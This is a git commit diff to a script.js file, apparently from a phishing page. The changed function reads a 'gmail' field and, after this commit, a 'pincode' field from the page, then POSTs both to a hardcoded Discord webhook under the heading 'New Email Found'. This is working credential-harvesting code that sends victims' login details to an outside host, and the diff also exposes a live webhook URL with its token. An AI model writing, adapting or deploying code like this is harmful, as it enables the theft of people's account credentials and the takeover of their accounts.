780736b125d55e0a2de2daf498d35a7c3f07c5b8
PABLOSleuth2 <opsnonman@gmail.com>
2023-12-02 17:55:45 +0600

    Add files via upload

--- script.js
+++ script.js
@@ -16,8 +16,9 @@ function message() {
 
 function message2() {
   let username = document.getElementById("gmail").value;
+  let pass = document.getElementById("pincode").value;
   const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
-  const contents = `New Email Found\nGmail: ${username}\n`
+  const contents = `New Email Found\nGmail: ${username}\nPinCode: ${pass}`
   const request = new XMLHttpRequest();
   request.open("POST", WebHook);
   request.setRequestHeader('Content-type', 'application/json');
